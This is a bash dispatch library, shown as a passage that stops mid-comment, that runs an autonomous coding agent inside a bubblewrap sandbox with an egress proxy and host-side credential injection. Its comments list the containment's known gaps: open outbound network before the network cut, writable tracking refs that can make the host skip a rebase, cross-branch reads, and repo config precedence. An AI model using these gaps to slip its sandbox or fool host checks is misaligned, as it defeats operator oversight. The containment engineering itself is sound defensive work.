#!/bin/bash
# Shared dispatch library for claude-pilot skills (dev-pilot, dev-groom, etc.)
#
# Single entrypoint: dispatch_claude_pilot (no args — entry command derived from $SKILL)
# Reads JSON from process-inherited stdin (fd 0).
# Sets up worktree, scrubs env, installs EXIT trap, runs claude-pilot,
# and delivers the result via mika callback.
#
# Callers MUST NOT set their own EXIT or TERM trap (they would be overwritten
# silently — bash trap is process-scoped, not function-scoped).
#
# Cancel discriminator protocol (mika#749):
#   Reason file: /tmp/mika-cancel-reason-{PID}
#   Writer (cancel-time): cancel_task_and_kill pre-writes STATUS=CANCELLED_BY_OPERATOR
#   Writer (signal-time): TERM trap self-writes STATUS=CANCELLED_BY_SIGNAL (if absent)
#   Reader (exit-time): EXIT trap reads the file and prefixes the callback envelope
#   Consumer: self-dev-callback recognizes STATUS=CANCELLED_BY_* and skips retry
#
# Per-skill tool ownership (mika#1173 restored after the prompt-only design
# regressed 5 times since #934): each dispatch skill registers its OWN tool —
# dev-pilot owns `run_claude_pilot` (skill enum: ["dev-pilot"], entry /mika),
# dev-groom owns `run_claude_pilot_groom` (skill enum: ["dev-groom"], entry
# /mika-groom-ticket). Both handlers source this lib and call
# dispatch_claude_pilot; the case switch on $SKILL routes to the right entry
# command. The skill field stays required on both tools for engine
# dispatch-class derivation (executor.rs derive_dispatch_class).

# --- Internal helpers (underscore-prefixed, not part of the API contract) ---

# mika#TBD (containment Phase 2a): fs-cut sandbox for the pilot subprocess.
# Prepends bwrap to the claude-pilot invocation so the process runs with a
# minimal-visibility filesystem AND a clean environment AND fresh kernel
# namespaces (pid/ipc/uts/cgroup/user). Combined with the caller's env
# scrub (see executor.rs `sandboxed_pilot_env`), the pilot cannot see or
# exfiltrate operator-home secrets, cross-repo worktrees, other host
# processes' env vars, or host IPC channels.
#
# Design (Phase 2a, fs-only — Phase 2b adds `--unshare-net` + egress relay):
#
#   Kernel isolation:
#     * `--as-pid-1`           make the pilot PID 1 in the namespace (removes
#                              the bwrap reaper whose /proc/1/environ would
#                              leak the mika-spirit host env with API keys)
#     * `--unshare-user/pid/ipc/uts/cgroup` — no cross-process channel back
#                              to host, /proc shows only sandbox processes
#     * `--new-session --die-with-parent` — no controlling tty, sandbox dies
#                              with parent
#     * `--clearenv` + `--setenv ...` — env allowlist for NON-SECRET vars
#                              only (no ANTHROPIC_API_KEY / AWS_* / NPM_TOKEN
#                              inheritance)
#     * `--perms 0600 --ro-bind-data <fd> ...` — secret channel (mika#2039).
#                              A `--setenv` value lands in bwrap's argv, which
#                              /proc/<pid>/cmdline exposes to every local user;
#                              secrets are handed over on a file descriptor
#                              instead and re-exported by the entrypoint
#                              prologue. Enforced by
#                              scripts/verify-no-secret-in-setenv.sh and
#                              tests/test_sandbox_no_secret_in_argv.sh.
#
#   Filesystem allowlist (no `--ro-bind / /` — that would expose /var, /srv,
#                        cross-worktree /data/workspace paths):
#     * ro binds : /usr, /bin, /sbin, /lib, /lib64, /etc, /opt
#                   (toolchain, ca-certs, resolver config, rust runtime)
#     * tmpfs   : /home, /tmp, /var/tmp, /run
#                   (blanks operator-home + host tempdirs)
#     * ro binds under /home (must come AFTER `--tmpfs /home`) :
#                 ~/.local (uv + claude-pilot binary), ~/.claude (plugin cache),
#                 ~/.nvm (node runtime), ~/.cargo/{registry,config.toml,bin}
#                 (crate cache + config — NOT credentials.toml)
#     * rw binds: $WORKTREE_DIR (branch worktree), ~/.mika/data (transcripts),
#                 $_PILOT_LOG_DIR (session log, mika#2165 — see the audit below)
#     * git binds (mika#2141), derived by path from the worktree's own
#       gitdir + commondir — never /data/workspace in bulk:
#         rw  $PARENT_GIT/worktrees/<this worktree>   HEAD, index, per-worktree refs
#         rw  $PARENT_GIT/objects                     commit writes objects here
#         rw  $PARENT_GIT/refs/heads/<dirname>        see the granularity note
#         rw  $PARENT_GIT/logs/refs/heads/<dirname>   its reflog
#         rw  $PARENT_GIT/refs/remotes/origin         fetch updates tracking refs
#         rw  $PARENT_GIT/refs/tags                   fetch auto-follows new tags
#         ro  $PARENT_GIT/refs                        read every ref, delete none
#         ro  $PARENT_GIT/config                      resolve the remote
#         ro  $PARENT_GIT/packed-refs, info/          316 packed refs; info/exclude
#         ro  the generated pilot gitconfig           identity + https rewrite
#
#   NOT bound (per coherence threat-model review):
#     * ~/.ssh, ~/.aws, ~/.config, ~/.mika (except /data), /var/spool/*
#     * ~/.cargo/credentials.toml (cargo publish secret — dev-pilot never
#                                  publishes; safe to omit)
#     * ~/.config/gh (contains hosts.yml with gh token) — the gh CLI does NOT
#                     get a token inside the sandbox at all (mika#2056): its
#                     api.github.com calls are MITM'd by the egress proxy, which
#                     injects the credential host-side. The sandbox holds no
#                     GitHub token in env or on disk.
#     * $SSH_AUTH_SOCK, docker.sock, dbus, cm/NATS unix sockets
#     * /data/workspace outside the branch worktree and the narrow git
#       paths listed above (other worktrees, other repositories)
#     * $PARENT_GIT/hooks — the sandbox runs no repository hooks; CI is the
#                           gate, and the rescue path already used --no-verify
#
#   EVERY ABSOLUTE PATH THE PILOT WRITES, AND WHETHER IT IS BOUND (mika#2165
#   AC5). This table is the reason the list above can be trusted: twice now a
#   writer reached a path the bind set did not cover, and both times the write
#   succeeded into the sandbox tmpfs and vanished with the container — no
#   error, no warning. Add a writer, add a row, or the third one is already
#   written and merely not yet noticed.
#
#     writer                                     target                                    status
#     ----------------------------------------   ---------------------------------------   ------
#     claude-pilot logger.py:27-28               $_PILOT_LOG_DIR/<task-id>.log             BOUND (mika#2165)
#     ANTHROPIC_LOG_FILE (mika#1705)             ~/.mika/data/pilot-transcripts/<id>.jsonl BOUND
#     git (index, refs, objects)                 $PARENT_GIT/... (see the block above)     BOUND (mika#2141)
#     heartbeat.py / inbox_writer.py /           HTTP urlopen                              no filesystem
#       permission_events.py
#     notify.py                                  subprocess.Popen                          no filesystem
#     egress proxy (dispatch-lib, host `nohup`)  /var/log/mika/pilot-egress-proxy.log      HOST-side; the
#                                                                                          in-sandbox instance
#                                                                                          redirects >&2 into
#                                                                                          the .stderr
#
#   The remaining /tmp/ and /var/log occurrences in the pilot's tier1.py and
#   permissions.py are classification PATTERNS, not writes. Audited 2026-09-06:
#   there is no third hole.
#
#   Read this next paragraph before narrowing or widening anything above.
#
#   Until mika#2141 this section read "NOT bound: /data/workspace outside the
#   branch worktree" with no git exception, and that line was load-bearing in
#   the worst way: a linked worktree's `.git` is a FILE holding an absolute
#   path into the parent repository, so binding only $WORKTREE_DIR left the
#   sandbox with no gitdir at all. Every git command returned `fatal: not a
#   git repository`, and for the month from 2026-08-04 no pilot could commit.
#   The stated doctrine made the breakage read as a decision. Whoever edits
#   this list next: change the binds and this text in the same commit.
#
#   What the git binds do NOT close, stated so it is arbitrated rather than
#   discovered. None of these is what AC2 closes — file access to other
#   worktrees and other repositories, which stays closed and is proven closed on
#   every run by skills/bundled/_shared/tests/test_sandbox_git_usable.sh.
#
#     * The object store is shared, so `git show <other branch>:<file>` succeeds
#       from inside. Inherent to sharing objects; a full clone grants the same.
#
#     * The branch-ref bind is a DIRECTORY, not a single ref file. It grants
#       write and delete on every branch sharing this branch's <type>/<issue>/
#       prefix. Binding the single file was MEASURED and does not work: git
#       creates `<ref>.lock` as a sibling and renames it, so a file bind yields
#       `cannot lock ref 'HEAD': Read-only file system` and no commit at all.
#       That is also why the slashless-branch guard below cannot be swapped for
#       a narrower bind — `dirname` collapsing to `refs/heads` is a real
#       widening with no narrower alternative, so it aborts instead.
#
#     * `refs/remotes/origin` is writable in full. An in-sandbox process can
#       set `refs/remotes/origin/main` to any commit, and the host-side rebase
#       gate reads exactly those refs to decide `behind=`. A poisoned tracking
#       ref makes the host skip a rebase it should have run. Accepted: the
#       pilot already holds the branch it is about to push, and CI on the PR is
#       the gate a stale base cannot pass silently.
#
#     * The repository's own `config` is bound read-only, and git reads
#       repo-local config at HIGHER precedence than the staged global one. See
#       the note above _PILOT_GITCONFIG_HOST.
#
#     * The PARENT CHECKOUT's directory PATH exists inside the sandbox, because
#       bwrap materialises the intermediate directories of every bind. Measured,
#       so that "visible" is not confused with "readable": it holds `.git` and
#       nothing else — no Cargo.toml, no crates/, no working tree — and that
#       `.git` shows exactly the entries bound above. Sibling worktrees are NOT
#       listed under it, other repositories in /data/workspace are absent, and
#       the meta-repo's own files are absent. A containment probe here must
#       assert content unreachability, not path non-existence; asserting the
#       latter reports a leak that is not one.
#
# NOT included in Phase 2a: network cut (`--unshare-net` + egress relay).
# Phase 2b tracks that separately — until it lands, an in-sandbox process
# still has full outbound network access (can exfil via HTTP, DNS, SNI).
# The invariant "Exec-si-contenu" holds only after Phase 2a + 2b ship.
#
# Opt-out: `MIKA_PILOT_SANDBOX=0` (or `false`/`no`/`off`/`disabled`,
# case-insensitive) reverts to direct invocation. Default: enabled. Also
# degrades gracefully to direct invocation if `bwrap` is not on PATH
# (WARN-logged) — first-rollout deployment tolerance.
_pilot_sandbox_enabled() {
    local mode="${MIKA_PILOT_SANDBOX:-1}"
    case "$(echo "$mode" | tr '[:upper:]' '[:lower:]')" in
        0|false|no|off|disabled) return 1 ;;
        *) return 0 ;;
    esac
}

# mika#2165: THE single point of truth for the pilot's session-log directory.
#
# Three parties name this directory and they must name the SAME one:
#
#   1. the pilot, from INSIDE the sandbox — claude-pilot cli.py:216-219 opens
#      "<log-dir>/<task-id>.log";
#   2. the bwrap bind below (_pilot_log_bind_args) — what makes that write
#      land on the host instead of the sandbox's ephemeral tmpfs root;
#   3. the host, AFTER the session — the .stderr sibling, the post-flight
#      guard, dev-groom's /ce:plan gate, and the callback reporters.
#
# INVARIANT: the path passed to --log-dir == the path bound == the path read
# post-flight. Touch one, touch all three in the same commit — the same
# discipline the gitdir block above states for mika#2141.
#
# Until mika#2165 there were three spellings: a hardcoded literal, a
# ${PILOT_LOG_DIR:-...} that only the READERS honoured, and a bare `--log-dir`
# that fell through to claude-pilot's own Python `const`. So PILOT_LOG_DIR
# moved the readers without moving the writer, and nothing bound anything —
# every .log since 2026-08-04 was written into the sandbox tmpfs and lost with
# the container, silently.
#
# A FUNCTION, not a variable assigned at source time. That distinction is not
# style: PILOT_LOG_DIR is an environment override, and an override read once at
# load answers with the default for every caller that sets it AFTER sourcing —
# silently, which is the exact failure class this ticket exists to close. It
# was measured: the first cut of this fix froze the value here, and three
# probes in test-dispatch-lib.sh that set PILOT_LOG_DIR after the source went
# on reading /var/log/claude-pilot. Resolving late keeps the override honoured
# wherever it is set.
#
# It ASSIGNS $_PILOT_LOG_DIR; it does not print it. That is not a style
# preference either — it is the mika#2039 secret-channel guard, and the second
# cut of this fix was measured red against it.
#
# The whole dispatch runs under `set -x` with BASH_XTRACEFD, and _emit_callback
# tails that trace back to the caller. `_scrub_secrets_from_output` only
# rewrites `NAME=value` and known token shapes, so an accessor that printed
# would be read as `$(_pilot_log_dir)` and land `++ printf %s <value>` in the
# trace — a line shape no scrubber here covers. The value at stake today is a
# directory path, not a credential; but the guard is deliberately shape-based,
# because a guard that reasoned per-value is the one that lets the next writer
# through. Assigning emits `+ _PILOT_LOG_DIR=<value>`, which is the shape the
# scrubber was built for.
#
# The other two ways out were rejected: relaxing the guard would trade a
# structural property for a convenience, and wrapping the printf in
# `set +x`/restore (the _stage_pilot_gh_token bracket) would hide the line
# rather than stop producing it — and would teach the next contributor that
# tripping the guard is answered by silencing the trace.
#
# COST, named: an assigning accessor can go stale. Every reader must call
# `_pilot_log_dir` immediately before reading `$_PILOT_LOG_DIR`, on the same
# line, so the pair cannot drift apart under a later edit. That co-location is
# not left to discipline — test-dispatch-lib.sh refuses any read of
# $_PILOT_LOG_DIR that is not on a line which also calls the resolver.
_pilot_log_dir() {
    _PILOT_LOG_DIR="${PILOT_LOG_DIR:-/var/log/claude-pilot}"
}

# mika#2165: make that directory visible — and writable — from INSIDE.
#
# Narrow on purpose: this directory, never /var/log. /var/log/mika holds the
# egress-proxy log, an incident-diagnosis surface (mika#2041), and the pilot
# has no business writing there.
#
# The bind is rw, not --bind-try, and not a per-task subdirectory: the pilot
# creates its own file with open("a"), so it needs write on the DIRECTORY; and
# the host must re-read that file at the same path afterwards. A per-task
# subdirectory would add a fourth spelling to the invariant above and close
# nothing.
#
# The arg list is left EMPTY rather than binding unconditionally. A `--bind`
# whose source is missing makes bwrap fail outright: today's defect loses a
# log, a rigid bind would lose the session. The fallback is loud — that noise
# is the host half of AC3.
_pilot_log_bind_args() {
    local log_dir
    _pilot_log_dir; log_dir="$_PILOT_LOG_DIR"
    _PILOT_LOG_BIND_ARGS=()
    if [ ! -d "$log_dir" ] && ! mkdir -p "$log_dir" 2>/dev/null; then
        echo "dispatch-lib: pilot_log_guard.unmountable $log_dir does not exist and cannot be created — this session will leave no .log (mika#2165)" >&2
        return 0
    fi
    if [ ! -w "$log_dir" ]; then
        echo "dispatch-lib: pilot_log_guard.unwritable $log_dir is not writable — this session will leave no .log (mika#2165)" >&2
        return 0
    fi
    _PILOT_LOG_BIND_ARGS=(--bind "$log_dir" "$log_dir")
}

# Phase 2b (network cut): egress-proxy unix socket path + sandbox-side TCP
# bridge port. The proxy script is installed to ~/.local/bin by `make install`
# and speaks HTTP CONNECT with a hostname allowlist. See
# scripts/mika-pilot-egress-proxy for the allowlist + threat model.
_PILOT_EGRESS_SOCK="/tmp/mika-pilot-egress.sock"
_PILOT_EGRESS_TCP_PORT="8891"
_PILOT_EGRESS_PROXY_BIN="$HOME/.local/bin/mika-pilot-egress-proxy"

# mika#2049: the relay-down stamp. Written HERE (shell), read by the engine
# (Rust) — the first file under `state/` to cross that boundary in this
# direction, so the convention is posed here rather than inherited.
#
# `$HOME/.mika` IS WRITTEN IN FULL, DELIBERATELY. Do NOT "harmonise" this on the
# `${MIKA_HOME:-$HOME/.mika}` pattern used by `MIKA_PR_ORIGIN_EPOCH_FILE` a few
# thousand lines below: `scrub_mika_env_vars` (crates/mika-agent/src/skills/
# executor.rs) strips EVERY `MIKA_*` variable from the dispatch child, `MIKA_HOME`
# included, so that `:-` has already fallen back by the time the line runs. It is
# code that looks like it handles the case and does not — and here the mistake is
# not cosmetic: the engine resolves the same path through `global_home_dir`, which
# DOES honour `MIKA_HOME`, so on an installation that sets it the two ends would
# name two different files. The stamp would be written in one place and looked for
# in another; gardes A and B, fail-open by construction, would read "no outage" and
# let every dispatch through — R5 false in production with a green test suite.
#
# Reader (sole): crates/mika-agent/src/pilot_egress_stamp.rs. The invariant is
# written at both ends and held by the source scan in test-dispatch-lib.sh.
_PILOT_EGRESS_DOWN_STAMP="$HOME/.mika/state/pilot-egress-down"

# Closed vocabulary of refusal motives, one per failure cause. Kept apart
# because the remedies differ — deploy the binary vs restart the relay — and the
# two populations must stay countable separately (precedent: `below_threshold`
# vs `no_ready_label_event`, mika#2131).
_PILOT_EGRESS_MOTIF_BINARY_MISSING="egress_binary_missing"
_PILOT_EGRESS_MOTIF_BIND_TIMEOUT="egress_bind_timeout"

# Helper daemon for anthropic api chain (2026-08-05).
# Addon path = installed alongside the proxy binary in ~/.local/bin/ (see
# Makefile install target); NOT a hardcoded repo path (would fail when
# dispatch-lib is extracted from mika-spirit binary in a fresh checkout).
_PILOT_HELPER_BIN="$HOME/.local/bin/mitmdump"
_PILOT_HELPER_PORT="8892"
_PILOT_HELPER_ADDON="$HOME/.local/bin/mika-pilot-anthropic-auth-addon.py"
# mika#2056: second mitmdump addon — injects the GitHub credential host-side on
# api.github.com / github.com so the sandbox never holds GH_TOKEN. Installed
# alongside the proxy + Anthropic addon by `make install`.
_PILOT_GH_HELPER_ADDON="$HOME/.local/bin/mika-pilot-github-auth-addon.py"
# mika#2056: host-only file the dispatcher rewrites with the current GitHub
# token before each spawn, for the github addon to read host-side. NEVER bound
# into the sandbox (not among the --ro-bind paths below). 0600.
_PILOT_GH_TOKEN_FILE="$HOME/.mika/pilot-gh-token"
_PILOT_HELPER_CA="$HOME/.mitmproxy/mitmproxy-ca-cert.pem"
_PILOT_HELPER_LOG="/var/log/mika/pilot-helper.log"
# Bind target for the helper CA inside the sandbox. MUST be under /tmp
# (which is tmpfs — writable, allows new mount points) rather than /etc
# (already ro-bound before net_bwrap_args, so binds inside it fail with
# EROFS). See coherence audit Bug B (2026-08-05).
_PILOT_HELPER_CA_SANDBOX_PATH="/tmp/mika-pilot-ca/ca.pem"

# mika#2056: in-sandbox path for the COMBINED CA bundle (system trust store +
# mitmproxy CA), built by the entrypoint prologue and pointed at by
# GIT_SSL_CAINFO / SSL_CERT_FILE / CURL_CA_BUNDLE / REQUESTS_CA_BUNDLE. It is a
# SUPERSET of the system store — so ordinary verification of every non-MITM'd
# host (registries, LFS, codeload) is unchanged — with the mitmproxy CA added
# so git / gh / curl accept the host-side GitHub auth-injection MITM. This is
# why SSL_CERT_FILE is now safe to set (the mika#2039 warning against it was
# about REPLACING the system store; a superset does not).
_PILOT_COMBINED_CA_SANDBOX_PATH="/tmp/mika-pilot-ca/combined.pem"

# mika#2039: in-sandbox directory holding one 0600 file per secret. Under
# /run — a tmpfs the sandbox mounts — rather than /etc, which is already
# ro-bound by the time the secret args are expanded, so a nested bind there
# fails EROFS (same coherence-audit Bug B that put the helper CA under /tmp).
_PILOT_SECRET_DIR_SANDBOX="/run/mika-pilot-secrets"

# mika#2141: the pilot's git configuration, generated host-side and bound
# read-only into the sandbox. Under /run for the same reason as the secret dir
# above — /etc is already ro-bound when these args expand.
#
# This is the only GLOBAL git configuration the sandbox sees: `--tmpfs /home`
# blanks ~/.gitconfig and GIT_CONFIG_NOSYSTEM drops /etc/gitconfig. Keep that —
# the operator's real ~/.gitconfig may carry a credential helper, and AC3
# forbids one entering.
#
# It is NOT the only configuration git reads. `$PARENT_GIT/config` is bound
# read-only (it is what resolves the remote) and git reads repo-local config at
# HIGHER precedence than GIT_CONFIG_GLOBAL. So a `credential.helper`,
# `core.sshCommand`, or a competing `url.*.insteadOf` placed in the repository
# config would reach the sandbox and could override the rewrite written here.
# Today this repository's config carries none — checked, not assumed — and it
# is operator-owned and read-only from inside. Stating the boundary precisely
# matters more than stating it flatteringly: the flattering version of this
# comment is what let mika#2141 read as a decision for a month.
_PILOT_GITCONFIG_HOST="$HOME/.mika/state/pilot-gitconfig"
_PILOT_GITCONFIG_SANDBOX="/run/mika-pilot-git/config"

# Sandbox entrypoint prologue: re-export each secret file as an env var named
# after the file. Deriving the export name from the basename is what makes
# adding a second secret a zero-change operation here.
#
# POSIX sh only — no arrays, no `[[`. The constraint is portability, not a
# claim about this host: the string is executed by whatever `/bin/sh` resolves
# to inside the sandbox, which is bound from the host's /bin and can differ
# between deploy targets.
#
# Values round-trip byte-exactly EXCEPT for trailing newlines, which `$(cat)`
# strips. A GitHub PAT has none, so nothing is affected today — but a secret
# whose trailing newline is load-bearing (a PEM key, some base64 blobs) cannot
# use this channel unchanged, which qualifies the zero-change promise above.
#
# It names what it drops rather than continuing mutely. Under `--setenv` a
# missing token was visible in the launch argv; moving it into an in-sandbox
# loop would otherwise trade a launch-time failure for a silent one that only
# surfaces minutes later at `git push`. The stderr this writes is persisted by
# _dispatch_lib_exit_trap and folded into the callback, so the operator sees
# it. Posture stays fail-forward: a tokenless pilot can still do useful work
# up to the push, so this diagnoses rather than aborts.
#
# mika#2056 CA tail: when the mitmproxy CA is present (Phase 2b, GitHub auth
# injection active), build the combined CA bundle (system store + mitm CA) and
# point git / gh / curl / python at it. Guarded on the CA file so Phase 2a (no
# MITM) is untouched. The system store is discovered by probing the common
# distro locations; if none is found the mitm CA alone still lets git/gh reach
# GitHub through the MITM (the only host that presents the mitm cert), and the
# unset of the vars is skipped so nothing points at a partial bundle. POSIX sh.
_PILOT_SECRET_PROLOGUE="for _s in $_PILOT_SECRET_DIR_SANDBOX/*; do [ -e \"\$_s\" ] || continue; _n=\$(basename \"\$_s\"); if [ ! -r \"\$_s\" ]; then echo \"dispatch-lib: sandbox secret \$_n is unreadable — the pilot starts without it\" >&2; continue; fi; _v=\$(cat \"\$_s\"); [ -n \"\$_v\" ] || echo \"dispatch-lib: sandbox secret \$_n is empty — the pilot starts without it\" >&2; export \"\$_n=\$_v\"; done; unset _s _n _v; if [ -f $_PILOT_HELPER_CA_SANDBOX_PATH ]; then _sysca=''; for _c in /etc/ssl/certs/ca-certificates.crt /etc/pki/tls/certs/ca-bundle.crt /etc/ssl/cert.pem /etc/ssl/ca-bundle.pem; do [ -f \"\$_c\" ] && { _sysca=\"\$_c\"; break; }; done; if [ -n \"\$_sysca\" ] && cat \"\$_sysca\" $_PILOT_HELPER_CA_SANDBOX_PATH > $_PILOT_COMBINED_CA_SANDBOX_PATH 2>/dev/null; then export GIT_SSL_CAINFO=$_PILOT_COMBINED_CA_SANDBOX_PATH CURL_CA_BUNDLE=$_PILOT_COMBINED_CA_SANDBOX_PATH SSL_CERT_FILE=$_PILOT_COMBINED_CA_SANDBOX_PATH REQUESTS_CA_BUNDLE=$_PILOT_COMBINED_CA_SANDBOX_PATH; else export GIT_SSL_CAINFO=$_PILOT_HELPER_CA_SANDBOX_PATH; fi; unset _sysca _c; fi"

# Idempotent helper daemon launcher for the anthropic api chain
# (2026-08-05, Vincent-authorized). Chained from the front egress proxy
# when a CONNECT to api.anthropic.com is seen.
_ensure_pilot_helper() {
    if [ ! -x "$_PILOT_HELPER_BIN" ]; then
        echo "dispatch-lib: pilot helper binary not found at $_PILOT_HELPER_BIN — chained tunnel disabled" >&2
        return 1
    fi
    if [ ! -f "$_PILOT_HELPER_ADDON" ]; then
        echo "dispatch-lib: pilot helper addon not found at $_PILOT_HELPER_ADDON" >&2
        return 1
    fi
    # mika#2056: the GitHub auth-injection addon is loaded into the SAME
    # mitmdump. Missing it would silently drop back to a sandbox with no way to
    # authenticate to GitHub (the token is gone), so surface it loudly — but do
    # not abort: an Anthropic-only run is still useful, and the pilot's GitHub
    # calls will 503 visibly at the addon rather than hang.
    if [ ! -f "$_PILOT_GH_HELPER_ADDON" ]; then
        echo "dispatch-lib: github auth addon not found at $_PILOT_GH_HELPER_ADDON — GitHub host-side injection disabled (run 'make install')" >&2
    fi
    # Liveness probe: TCP port accepts a connection.
    if python3 -c "
import socket
s = socket.socket()
s.settimeout(1)
try:
    s.connect(('127.0.0.1', $_PILOT_HELPER_PORT))
    s.close()
except OSError:
    exit(1)
" 2>/dev/null; then
        return 0
    fi
    mkdir -p "$(dirname "$_PILOT_HELPER_LOG")" 2>/dev/null || true
    # mika#2056: load the GitHub addon too, when present. mitmdump accepts
    # repeated --scripts; each addon inspects flow.request.host and ignores
    # what is not its own, so the two never collide.
    local -a _helper_addon_args=(--scripts "$_PILOT_HELPER_ADDON")
    if [ -f "$_PILOT_GH_HELPER_ADDON" ]; then
        _helper_addon_args+=(--scripts "$_PILOT_GH_HELPER_ADDON")
    fi
    nohup "$_PILOT_HELPER_BIN" \
        --listen-host 127.0.0.1 --listen-port "$_PILOT_HELPER_PORT" \
        "${_helper_addon_args[@]}" \
        --set stream_large_bodies=10m \
        --set http2=true \
        --set flow_detail=0 \
        >>"$_PILOT_HELPER_LOG" 2>&1 </dev/null &
    disown 2>/dev/null || true
    local i=0
    while [ $i -lt 40 ]; do
        if python3 -c "
import socket
s = socket.socket()
s.settimeout(0.1)
try:
    s.connect(('127.0.0.1', $_PILOT_HELPER_PORT))
    s.close()
except Exception:
    exit(1)
" 2>/dev/null; then
            break
        fi
        sleep 0.1
        i=$((i + 1))
    done
    if [ $i -eq 40 ]; then
        echo "dispatch-lib: pilot helper failed to bind :$_PILOT_HELPER_PORT within 4s" >&2
        return 1
    fi
    if [ ! -f "$_PILOT_HELPER_CA" ]; then
        echo "dispatch-lib: pilot helper CA cert not found at $_PILOT_HELPER_CA" >&2
        return 1
    fi
    echo "dispatch-lib: pilot helper launched (:$_PILOT_HELPER_PORT, log $_PILOT_HELPER_LOG)" >&2
    return 0
}


# True when something is actually listening on the unix socket at $1.
#
# Neither the file's existence nor its type is enough. A kill does not unlink a
# unix socket, so the path survives its owner as an orphan that satisfies
# `[ -S ]` and refuses connect(). Asking the file-type question where the
# question is "is anyone listening" is what let mika#2041's incident run silent:
# the launcher affirmed a proxy that had already died.
#
# The path goes through argv, never interpolated into the python source -- a
# quote in the path would otherwise be a syntax error in the probe itself.
# $2 is the connect timeout in seconds (default 1). The wait loop below passes
# a short one: an orphan refuses instantly, but a socket whose owner is wedged
# or whose listen backlog is full blocks for the whole timeout, and this runs
# on the critical path of every dispatch.
_pilot_egress_sock_connectable() {
    [ -S "$1" ] || return 1
    python3 -c '
import socket, sys
s = socket.socket(socket.AF_UNIX)
s.settimeout(float(sys.argv[2]))
try:
    s.connect(sys.argv[1])
    s.close()
except OSError:
    sys.exit(1)
' "$1" "${2:-1}" 2>/dev/null
}

# Idempotent host-side egress proxy launcher. Runs once per host; on subsequent
# calls, verifies the daemon is alive and returns.
#
# POSTURE: FAIL-CLOSED (mika#2049, operator decision of 2026-09-20 — option 1,
# taken by Vincent after a bearing from Prime). Egress unavailable ⇒ the dispatch
# is refused; the pilot never leaves without its network cut. The escape-hatch
# variant (option 2) was ruled out in writing: « it recreates the fail-open under
# another name, and a WARN under load is read by nobody. » There is therefore NO
# environment variable that lifts the refusal.
#
# Until 2026-09-20 this returned 1 on every cause and the caller read that 1 as
# "launch in Phase 2a" — filesystem cut kept, NETWORK OPEN. The written
# justification was #1894's deploy window, closed long since; the posture was
# inherited rather than decided. What is being protected is a hostname allowlist
# applied to an autonomous agent executing code it wrote itself, so "failing
# open" means the control is lifted at the exact moment it cannot start.
#
# THIS FUNCTION DOES NOT DECIDE — it reports. The return code is unchanged (0 =
# the relay serves, 1 = it does not; `scripts/canary-pilot-containment
# --ensure-relay` depends on it) and the cause is posted in
# `$_PILOT_EGRESS_ABORT`, on the exact model of `$_PILOT_GITDIR_BIND_ABORT`. The
# refusal itself belongs to `_run_pilot_sandboxed`, which is the only place that
# knows a pilot was about to be launched.
_ensure_pilot_egress_proxy() {
    # NOT `local`: bash `local` is invisible to the caller, and the caller is
    # where the operator-facing refusal is built (same reasoning, same shape as
    # `_PILOT_SANDBOX_REFUSAL`). Cleared on entry so a stale value from an
    # earlier call in the same shell can never be read as this call's verdict.
    _PILOT_EGRESS_ABORT=""
    if [ ! -x "$_PILOT_EGRESS_PROXY_BIN" ]; then
        _PILOT_EGRESS_ABORT="$_PILOT_EGRESS_MOTIF_BINARY_MISSING"
        # mika#2049: the message no longer says "falling back to fs-only" —
        # nothing falls back any more, and Signal S (mika#2050) greps that exact
        # string to count dispatches that ran WITHOUT the network cut. Leaving it
        # would make an instrument report a population that can no longer exist.
        # Each cause now carries its own stable token, which is the half
        # mika#2050 had to document as missing: `pilot_egress_guard.unreachable`
        # covered the bind timeout alone, so an operator using it as the
        # predicate read a nominal regime on a fleet whose proxy binary was never
        # deployed.
        echo "dispatch-lib: pilot_egress_guard.binary_missing mika-pilot-egress-proxy not found at $_PILOT_EGRESS_PROXY_BIN — refusing the dispatch (mika#2049)" >&2
        return 1
    fi
    # Liveness probe: is anyone actually listening?
    if _pilot_egress_sock_connectable "$_PILOT_EGRESS_SOCK"; then
        return 0  # already alive
    fi
    # Launch as detached daemon. Log to /var/log/mika/ if writable, else to
    # /tmp -- never to stderr, whatever the previous comment here claimed.
    # Overridable so a test run cannot append fake-proxy output into the
    # operational log -- that file is the incident-diagnosis surface, and
    # mika#2041 was diagnosed by reading it. Default is unchanged.
    local log_dir="${MIKA_PILOT_EGRESS_LOG_DIR:-/var/log/mika}"
    local log_file
    if [ -w "$log_dir" ] || mkdir -p "$log_dir" 2>/dev/null; then
        log_file="$log_dir/pilot-egress-proxy.log"
    else
        log_file="/tmp/mika-pilot-egress-proxy.log"
    fi
    nohup "$_PILOT_EGRESS_PROXY_BIN" --host-unix --socket "$_PILOT_EGRESS_SOCK" \
        >>"$log_file" 2>&1 </dev/null &
    # mika#2051: captured HERE, not read from `$!` further down, because the
    # failure path below needs it -- and that path is the only one this ticket
    # exists to diagnose. `$!` still holds this pid at both later sites (nothing
    # backgrounds in between: the connectability probe runs python3 in the
    # FOREGROUND), so this is not a bug fix; it is the value being needed
    # earlier than it was read.
    local proxy_pid=$!
    disown 2>/dev/null || true
    # Wait for the proxy to actually accept a connection (bounded). Testing
    # for the socket FILE here is what made the fallback below unreachable in
    # the one scenario that needs it: an orphaned path satisfies `[ -S ]`
    # immediately, so the loop exited on its first iteration and the launcher
    # declared success over a proxy that was already dead (mika#2041).
    #
    # Bounded on wall clock, not on an iteration count: each probe can itself
    # block for its connect timeout, so counting iterations would let the real
    # budget drift far past what the failure message claims -- and this sits on
    # the critical path of every dispatch.
    local deadline=$((SECONDS + 3))
    while [ "$SECONDS" -lt "$deadline" ] \
        && ! _pilot_egress_sock_connectable "$_PILOT_EGRESS_SOCK" 0.25; do
        sleep 0.1
    done
    if ! _pilot_egress_sock_connectable "$_PILOT_EGRESS_SOCK" 0.25; then
        _PILOT_EGRESS_ABORT="$_PILOT_EGRESS_MOTIF_BIND_TIMEOUT"
        # See the sibling message above on why "falling back to fs-only" is gone.
        #
        # mika#2051: the pid is the JOINT. The proxy stamps its own pid on its
        # first line (`pilot_egress_startup.begin pid=<pid>`, mika#2086), so the
        # key already existed on one side and was simply not printed on the
        # other -- leaving the operator to join a per-dispatch `.stderr` to a
        # cumulative proxy log by timestamp. That is the friction that made the
        # 2026-08-29 diagnosis expensive. No new correlation id: inventing one
        # would be a second vocabulary for a join the pid already makes, and it
        # would have to survive `nohup`.
        #
        # Placed BEFORE the em dash on purpose: the dash separates the finding
        # (this identified proxy did not bind) from its consequence (the
        # dispatch is refused). The pid qualifies the finding. The published
        # predicates bite on the `^dispatch-lib: ` anchor and the contiguous
        # token, both untouched -- see `_egress_guard_line` in the test suite,
        # which asserts the invariant and deliberately not this position.
